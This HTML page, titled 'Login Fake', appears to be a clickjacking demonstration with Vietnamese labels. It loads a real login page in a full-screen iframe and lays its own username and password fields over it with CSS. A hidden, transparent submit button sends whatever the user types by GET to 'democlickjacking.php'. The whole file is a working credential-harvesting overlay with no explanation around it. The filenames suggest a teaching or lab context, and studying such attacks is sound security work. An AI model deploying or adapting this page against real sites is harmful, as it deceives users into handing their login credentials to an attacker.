<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-KK94CHFLLe+nY2dmCWGMq91rCGa5gtU4mk92HdvYe+M/SXH301p5ILy+dN9+nJOZ" crossorigin="anonymous">
    <title>Login Fake</title>
    <style>
        iframe {
			position: fixed; 
			top: 0px; 
			left: 0px; 
			right: 0px; 
			bottom: 0px; 
			width: 100%; 
			height: 100%;
			border: none;
			margin: 0;
			padding: 0;
			overflow: hidden;
		}
        .form-container {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 80%;
            max-width: 500px;
            z-index: 1000;
            margin: auto;
        }
        .username{
            width: 100%;
            margin-top: -320px;
        }
        .password{
            margin-top:  48px;
        }
        .login{
            margin-top: 17px;
            opacity: 0;
        }
    </style>
</head>
<body>
    <iframe src="loginreal.php" width="100%" height="500"></iframe>
    <div class="form-container">
		<form action="democlickjacking.php" method="get">
			<input type="text" class="form-control username" id="exampleFormControlInput1" name="username" placeholder="Nhập username">
			<input type="text" class="form-control password" id="exampleFormControlInput1" name="password" placeholder="Nhập password">
			<button type="submit" class="btn btn-outline-success login">Đăng nhập</button>
		</form>
	</div>
</body>
</html>